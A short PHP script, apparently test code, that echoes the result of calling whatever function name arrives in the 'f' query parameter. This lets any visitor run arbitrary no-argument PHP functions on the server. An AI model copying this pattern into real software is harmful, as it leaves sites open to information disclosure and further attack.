<?php

function test(){
    include 'api.php';
    
  }
  if (isset($_GET['f'])) {
    echo $_GET['f']();
  }
?>